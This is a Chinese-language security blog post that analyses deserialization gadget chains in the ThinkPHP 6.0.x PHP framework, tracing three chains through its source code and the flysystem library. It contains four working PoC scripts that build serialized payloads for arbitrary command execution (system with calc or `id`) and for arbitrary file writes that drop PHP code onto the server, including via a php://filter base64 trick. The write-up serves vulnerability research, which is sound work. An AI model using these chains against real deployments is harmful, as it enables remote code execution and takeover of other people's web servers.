<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    
    <title>
        ThinkPHP6.0.X反序列化利用链 |
        
        p0l1st&#39;s blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="漏洞环境首先下载tp6.0.3 composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603  然后更新版本 composer update   app&#x2F;controller&#x2F;Index.php设置反序列化可控点  漏洞分析利用链1全局搜索_destruct,定位到src\Model.php   $this-&gt;lazySave可控，">
<meta property="og:type" content="article">
<meta property="og:title" content="ThinkPHP6.0.X反序列化利用链">
<meta property="og:url" content="http://example.com/2024/07/10/ThinkPHP6-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
<meta property="og:site_name" content="p0l1st&#39;s blog">
<meta property="og:description" content="漏洞环境首先下载tp6.0.3 composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603  然后更新版本 composer update   app&#x2F;controller&#x2F;Index.php设置反序列化可控点  漏洞分析利用链1全局搜索_destruct,定位到src\Model.php   $this-&gt;lazySave可控，">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825872.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825951.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825284.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825133.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825834.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825297.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825318.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825038.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825027.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825068.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825230.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221826696.png">
<meta property="og:image" content="http://example.com/images/image-20240710104447027.png">
<meta property="og:image" content="http://example.com/images/image-20240710105329488.png">
<meta property="og:image" content="http://example.com/images/image-20240710105426998.png">
<meta property="og:image" content="http://example.com/images/image-20240710105649242.png">
<meta property="og:image" content="http://example.com/images/image-20240710110533476.png">
<meta property="og:image" content="http://example.com/images/image-20240710111255038.png">
<meta property="og:image" content="http://example.com/images/image-20240710112522232.png">
<meta property="og:image" content="http://example.com/images/image-20240710113246417.png">
<meta property="og:image" content="http://example.com/images/image-20240710114039168.png">
<meta property="og:image" content="http://example.com/images/image-20240710114832276.png">
<meta property="og:image" content="http://example.com/images/image-20240710115743276.png">
<meta property="og:image" content="http://example.com/images/image-20240710115904861.png">
<meta property="og:image" content="http://example.com/images/image-20240710121445539.png">
<meta property="og:image" content="http://example.com/images/image-20240710122144858.png">
<meta property="og:image" content="http://example.com/images/image-20240710122338092.png">
<meta property="og:image" content="http://example.com/images/image-20240710122453451.png">
<meta property="og:image" content="http://example.com/images/image-20240710123707632.png">
<meta property="og:image" content="http://example.com/images/image-20240710140857921.png">
<meta property="og:image" content="http://example.com/images/image-20240710142424159.png">
<meta property="og:image" content="http://example.com/images/image-20240710142552073.png">
<meta property="og:image" content="http://example.com/images/image-20240710143805789.png">
<meta property="og:image" content="http://example.com/images/image-20240710143722191.png">
<meta property="og:image" content="http://example.com/images/image-20240710144420032.png">
<meta property="article:published_time" content="2024-07-10T01:49:16.000Z">
<meta property="article:modified_time" content="2024-08-22T10:28:20.969Z">
<meta property="article:author" content="p0l1st">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png">
    
    
    
        
            <link rel="stylesheet" href="http://example.com/css/markdown.css">
        
            <link rel="stylesheet" href="http://example.com/css/july.css">
        
    
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
</head>
<body>

<div id="banner-outer" class="hidden">
    <div id="banner-image" style="background-image: url()"></div>
    <img src="https://www.gravatar.com/avatar/7a585313ed855e8d652cbb3154a6056e?s=300&amp;d=mm&amp;r=g" id="avatar">
</div>

<div id="menu-outer">
    <div id="menu-inner">
        
            <a class="false" href="http://example.com/index.html">Home</a>
        
            <a class="false" href="http://example.com/archives/index.html">Archives</a>
        
            <a class="false" href="http://example.com/about/index.html">About</a>
        
    </div>
</div>

<div id="content-outer" class="container">
    <div id="content-inner">
        <article id="post">
    <h1 id="post-title">ThinkPHP6.0.X反序列化利用链</h1>
    <time id="post-date" datetime="2024-07-10T01:49:16.000Z">
        July 10, 2024
    </time>
    <div id="post-content" class="markdown-body">
        <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>首先下载tp6.0.3</p>
<pre><code>composer create-project topthink/think=6.0.3 tp603
</code></pre>
<p>然后更新版本</p>
<pre><code>composer update
</code></pre>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png" alt="image-20240710095443189"></p>
<p>app&#x2F;controller&#x2F;Index.php设置反序列化可控点</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825872.png" alt="image-20240710095655616"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h2><p>全局搜索_destruct,定位到src\Model.php</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825951.png" alt="image-20240710100016061"></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825284.png" alt="image-20240710100037629"></p>
<p>$this-&gt;lazySave可控，直接跟进save方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825133.png" alt="image-20240710100556355"></p>
<p>继续跟进updateData方法，发现其调用了检查字段的checkAllowFields方法，跟进</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825834.png" alt="image-20240710100832177"></p>
<p>checkAllowFields方法又调用了db方法，继续跟进</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825297.png" alt="image-20240710101033350"></p>
<p>这里的$this-&gt;table和$this-&gt;suffix都是可控的，可以利用字符串拼接来触发toString方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825318.png" alt="image-20240710101254556"></p>
<p>我们再来全局搜索toString方法，跟进\src\model\concern\Conversion.php中的toJson方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825038.png" alt="image-20240710103400986"></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825027.png" alt="image-20240710103512162"></p>
<p>其调用了toArray方法，跟进</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825068.png" alt="image-20240710103844186">继续跟进getAttr方法，发现在try中调用了getData方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825230.png" alt="image-20240710104115113"></p>
<p>跟进getData方法，其又调用了getRealFieldName方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221826696.png" alt="image-20240710104226388"></p>
<p>跟进getRealFieldName，当$this-&gt;strict为true时会返回$name</p>
<p><img src="/../images/image-20240710104447027.png" alt="image-20240710104447027"></p>
<p>回到getData方法，$fieldName得到$name返回值后会进入由array_key_exists()进行判断然后返回$this-&gt;data&#x3D;[$fieldName]</p>
<p><img src="/../images/image-20240710105329488.png" alt="image-20240710105329488"></p>
<p>再回到getAttr，最终return会调用getValue方法</p>
<p><img src="/../images/image-20240710105426998.png" alt="image-20240710105426998"></p>
<p>跟进getValue方法，发现有$value   &#x3D; $closure($value, $this-&gt;data)，这里的$closure、$value和$this-&gt;data都是可控的，那么就可以使得$closure作为函数名、$value和$this-&gt;data作为参数实现任意函数执行</p>
<p><img src="/../images/image-20240710105649242.png" alt="image-20240710105649242"></p>
<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="php">&lt;?php
namespace think;
abstract class Model&#123;
    use model\concern\Attribute;
    use model\concern\ModelEvent;
    protected $table;
    private $force;
    private $exists;
    private $lazySave;
    private $data = [];
    function __construct($obj)&#123;
        $this-&gt;table = $obj;
        $this-&gt;force = true;
        $this-&gt;exists = true;
        $this-&gt;lazySave = true;
        $this-&gt;data = [&quot;p0l1st&quot; =&gt; &quot;calc&quot;];
    &#125;
&#125;

namespace think\model\concern;
trait ModelEvent&#123;
    protected $withEvent = true;
    protected $visible = [&quot;p0l1st&quot; =&gt; &quot;1&quot;];
&#125;
trait Attribute&#123;
    private $withAttr = [&quot;p0l1st&quot; =&gt; &quot;system&quot;];
&#125;

namespace think\model;
use think\Model;
class Pivot extends Model&#123;
    function __construct($obj = &#39;&#39;)&#123;
        parent::__construct($obj);
    &#125;
&#125;

echo urlencode(serialize(new Pivot(new Pivot())));
?&gt;
</code></pre>
<p><img src="/../images/image-20240710110533476.png" alt="image-20240710110533476"></p>
<h2 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h2><p>继续全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php</p>
<p><img src="/../images/image-20240710111255038.png" alt="image-20240710111255038"></p>
<p>$this-&gt;autosave可控，但是AbstractCache是一个抽象类，本身的sava()方法不可用，所以在其继承类中寻找可利用的save方法</p>
<p>跟进vendor\topthink\framework\src\think\filesystem\CacheStore.php中的save方法</p>
<p><img src="/../images/image-20240710112522232.png" alt="image-20240710112522232"></p>
<p>发现其调用了getForStorage方法，继续跟进</p>
<p><img src="/../images/image-20240710113246417.png" alt="image-20240710113246417"></p>
<p>再跟进cleanContents方法，其调用array_flip()对数组进行反转来交换数组中的键值，然后调用array_intersect_key使用键名比较计算数组的交集</p>
<p><img src="/../images/image-20240710114039168.png" alt="image-20240710114039168"></p>
<p>再回到Cachestore类，这里的$this-&gt;store也是可控的，那我们就可以调用任意类的set方法，如果这个类不存在set方法可能触发call方法</p>
<p><img src="/../images/image-20240710114832276.png" alt="image-20240710114832276"></p>
<h3 id="PoC1"><a href="#PoC1" class="headerlink" title="PoC1"></a>PoC1</h3><p>直接找一个可以利用的set方法</p>
<p>跟进src&#x2F;think&#x2F;cache&#x2F;driver&#x2F;File.php中的set方法，发现有一个serialize方法</p>
<p><img src="/../images/image-20240710115743276.png" alt="image-20240710115743276"></p>
<p>跟进serialize方法，发现$this-&gt;options参数是可控的，那我们就可以利用它执行任意函数</p>
<p><img src="/../images/image-20240710115904861.png" alt="image-20240710115904861"></p>
<p>再看$data,$data来源于$value，而$value来源于$contents，$contents来源于getForStorage，需要经过json_encode方法处理，所以需要使json_encode后的数据被当作代码执行</p>
<p>Linux中可以用这样的形式</p>
<p><img src="/../images/image-20240710121445539.png" alt="image-20240710121445539"></p>
<pre><code class="php">&lt;?php 

namespace League\Flysystem\Cached\Storage &#123;
    abstract class AbstractCache &#123;
        protected $autosave = false;
        protected $complete = &quot;`id`&quot;;
        // protected $complete = &quot;\&quot;&amp;whoami&amp;&quot; ;
        // 在Windows环境中反引号无效，用&amp;替代
    &#125;
&#125;

namespace think\filesystem &#123;
    use League\Flysystem\Cached\Storage\AbstractCache;
    class CacheStore extends AbstractCache &#123;
        protected $key = &quot;1&quot;;
        protected $store;
        public function __construct($store=&quot;&quot;) &#123;
            $this-&gt;store = $store;
        &#125;
    &#125;
&#125;

namespace think\cache &#123;
    abstract class Driver &#123;
        protected $options = [&quot;serialize&quot;=&gt;[&quot;system&quot;],&quot;expire&quot;=&gt;1,&quot;prefix&quot;=&gt;&quot;1&quot;,&quot;hash_type&quot;=&gt;&quot;sha256&quot;,&quot;cache_subdir&quot;=&gt;&quot;1&quot;,&quot;path&quot;=&gt;&quot;1&quot;];
    &#125;
&#125;

namespace think\cache\driver &#123;
    use think\cache\Driver;
    class File extends Driver&#123;&#125;
&#125;

namespace &#123;
    $file = new think\cache\driver\File();
    $cache = new think\filesystem\CacheStore($file);
    echo base64_encode(serialize($cache));
&#125;
?&gt;
</code></pre>
<h3 id="PoC2"><a href="#PoC2" class="headerlink" title="PoC2"></a>PoC2</h3><p>继续跟进src&#x2F;think&#x2F;cache&#x2F;driver&#x2F;File.php中的set方法，该方法后面还调用了file_put_contents方法</p>
<p><img src="/../images/image-20240710122144858.png" alt="image-20240710122144858"></p>
<p>先跟进$filename，发现其又调用了getCacheKey方法</p>
<p><img src="/../images/image-20240710122338092.png" alt="image-20240710122338092"></p>
<p>继续跟进，这里的$this-&gt;options[‘hash_type’]是可控的，而$name也可控，所以hash后的文件名也可控，而$this-&gt;options[‘path’]则可以利用伪协议来指定路径</p>
<p><img src="/../images/image-20240710122453451.png" alt="image-20240710122453451"></p>
<p>再看$data，其来源于$this-&gt;serialize($value)，但是后面拼接时有exit()，可以使用php:&#x2F;&#x2F;filter绕过</p>
<p>那么至此就存在任意文件写入</p>
<pre><code class="php">&lt;?php

namespace League\Flysystem\Cached\Storage &#123;
    abstract class AbstractCache &#123;
        protected $autosave = false;
        protected $complete = &quot;uuuPD9waHAgcGhwaW5mbygpOw==&quot;;
    &#125;
&#125;

namespace think\filesystem &#123;
    use League\Flysystem\Cached\Storage\AbstractCache;
    class CacheStore extends AbstractCache &#123;
        protected $key = &quot;1&quot;;
        protected $store;
        public function __construct($store=&quot;&quot;) &#123;
            $this-&gt;store = $store;
        &#125;
    &#125;
&#125;

namespace think\cache &#123;
    abstract class Driver &#123;
        protected $options = [&quot;serialize&quot;=&gt;[&quot;trim&quot;],&quot;expire&quot;=&gt;1,&quot;prefix&quot;=&gt;false,&quot;hash_type&quot;=&gt;&quot;md5&quot;,&quot;cache_subdir&quot;=&gt;false,&quot;path&quot;=&gt;&quot;php://filter/write=convert.base64-decode/resource=../&quot;,&quot;data_compress&quot;=&gt;0];
    &#125;
&#125;

namespace think\cache\driver &#123;
    use think\cache\Driver;
    class File extends Driver&#123;&#125;
&#125;

namespace &#123;
    $file = new think\cache\driver\File();
    $cache = new think\filesystem\CacheStore($file);
    echo urlencode(serialize($cache));
&#125;
?&gt;
</code></pre>
<p><img src="/../images/image-20240710123707632.png" alt="image-20240710123707632"></p>
<h2 id="利用链3"><a href="#利用链3" class="headerlink" title="利用链3"></a>利用链3</h2><p>链子的起点和上一条链子一样，但是这里选择跟进vendor\league\flysystem-cached-adapter\src\Storage\Adapter.php的save方法</p>
<p>$contents来自$this-&gt;getForStorage()，后面处理也和上一条链子一样</p>
<p><img src="/../images/image-20240710140857921.png" alt="image-20240710140857921"></p>
<p>继续看下面的if，我们想要利用write()写文件就需要使has方法返回false</p>
<p>这里找一个同时有has和write方法的类 vendor\league\flysystem\src\Adapter\Local.php</p>
<p>先跟进has方法</p>
<p><img src="/../images/image-20240710142424159.png" alt="image-20240710142424159"></p>
<p>再跟进applyPathPrefix方法，该方法调用了getPathPrefix方法，而getPathPrefix方法中的$this-&gt;pathPrefix是可控的，ltrim删除字符串开头的\和&#x2F;。因此可以将可控的getPathPrefix作为文件路径，并且使得has方法执行file_exists时文件名不存在即可</p>
<p><img src="/../images/image-20240710142552073.png" alt="image-20240710142552073"></p>
<p>再看write方法，$location为经过applyPathPrefix方法处理的路径，$contents是经过json_encode处理后的json数据</p>
<p><img src="/../images/image-20240710143805789.png" alt="image-20240710143805789"></p>
<p><img src="/../images/image-20240710143722191.png" alt="image-20240710143722191"></p>
<h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="php">&lt;?php

namespace League\Flysystem\Cached\Storage &#123;
    abstract class AbstractCache &#123;
        protected $autosave = false;
        protected $cache = [&quot;p0l1st&quot; =&gt; &quot;&lt;?php phpinfo();?&gt;&quot;];
    &#125;
&#125;

namespace League\Flysystem\Cached\Storage &#123;
    use League\Flysystem\Cached\Storage\AbstractCache;
    class Adapter extends AbstractCache &#123;
        protected $file;
        protected $adapter;
        public function __construct($adapter = &quot;&quot;) &#123;
            $this-&gt;file = &quot;../ppppp.php&quot;;
            $this-&gt;adapter = $adapter;
        &#125;
    &#125;
&#125;

namespace League\Flysystem\Adapter &#123;
    class Local &#123;
        protected $writeFlags = 0;
    &#125;
&#125;

namespace &#123;
    $local = new League\Flysystem\Adapter\Local();
    $cache = new League\Flysystem\Cached\Storage\Adapter($local);
    echo urlencode(serialize($cache));
&#125;
?&gt;
</code></pre>
<p><img src="/../images/image-20240710144420032.png" alt="image-20240710144420032"></p>

    </div>
</article>

<div id="paginator">
    
</div>

    </div>
</div>

<div id="bottom-outer">
    <div id="bottom-inner">
        2019-2024 p0l1st 皖ICP备16011445号
    </div>
</div>

<div id="to-top">
    <i class="iconfont icon-up"></i>
</div>


    
        <script src="http://example.com/js/jquery-3.4.1.min.js"></script>
    
        <script src="http://example.com/js/highlight-9.13.1.min.js"></script>
    
        <script src="http://example.com/js/transition.js"></script>
    
        <script src="http://example.com/js/smooth-scroll.min.js"></script>
    



    <script>
      $(function () {
        $('#banner-outer').addClass('fade-out')
        $('#menu-outer').addClass('fade-show')

        $('pre').each(function (i, block) {
          hljs.highlightBlock(block);
        });
      })
    </script>


<script>
  $(function () {
    $(window).scroll(function () {
      if ($(window).scrollTop() > 150) {
        $("#to-top").fadeIn();
      } else {
        $("#to-top").fadeOut();
      }
    });
    $("#to-top").click(function () {
      $("body,html").animate({scrollTop: 0}, 500);
      return false;
    })
  })
</script>
</body>
</html>
